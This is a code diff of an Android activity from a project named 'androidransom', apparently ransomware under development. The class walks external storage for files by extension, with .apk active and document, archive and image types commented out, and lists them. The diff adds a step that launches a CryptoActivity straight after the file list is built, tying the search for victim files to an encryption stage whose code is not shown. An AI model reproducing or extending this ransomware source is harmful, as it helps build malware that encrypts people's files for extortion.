@@ -1,19 +1,17 @@
 package bycracks.androidransom;
 
-import android.app.Activity;
+import android.content.Intent;
 import android.os.Bundle;
 import android.os.Environment;
+import android.support.v7.app.AppCompatActivity;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 
 import java.io.File;
 import java.util.ArrayList;
 
-/**
- * Created by raven on 2017-05-17.
- */
 
-public class SubActivity extends Activity {
+public class SubActivity extends AppCompatActivity {
     String[] ext = {".apk"/*, ".txt", ".pdf", ".zip", ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
     ArrayList <String> myList = new ArrayList<String>();
 
@@ -29,6 +27,9 @@ public class SubActivity extends Activity {
 
         ListView listview = (ListView) findViewById(R.id.list);
         listview.setAdapter(new ArrayAdapter<String>(SubActivity.this, android.R.layout.simple_list_item_1,myList));
+
+        Intent intent = new Intent(SubActivity.this, CryptoActivity.class);
+        startActivity(intent);
 
     }
 
@@ -49,5 +50,7 @@ public class SubActivity extends Activity {
 
         }
     }
+
+
 
 }
